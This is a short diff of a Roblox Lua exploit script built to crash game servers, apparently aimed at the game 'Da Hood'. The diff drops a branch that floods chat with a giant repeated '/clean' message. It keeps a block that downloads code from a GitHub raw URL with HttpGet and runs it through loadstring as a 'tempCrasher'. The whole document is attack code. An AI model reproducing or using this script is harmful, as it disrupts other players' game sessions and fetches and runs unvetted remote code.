@@ -2,17 +2,7 @@ local plrs = game:GetService("Players")
 
 local plrCount = #plrs:GetPlayers()
 
-if plrCount < 8 then
-  local prefixe = "/"
-
-  local Message = (prefixe.. "clean".." "):rep(100000)
-
-  for i = 1, 1000 do
-      game.Players:Chat(Message)
-  end 
-else
   if not shared.tempCrasher then
     shared.tempCrasher = loadstring(game:HttpGet("https://raw.githubusercontent.com/iamtryingtofindname/Krampus/main/Da-Hood/trash"))
   end
   shared.tempCrasher()
-end
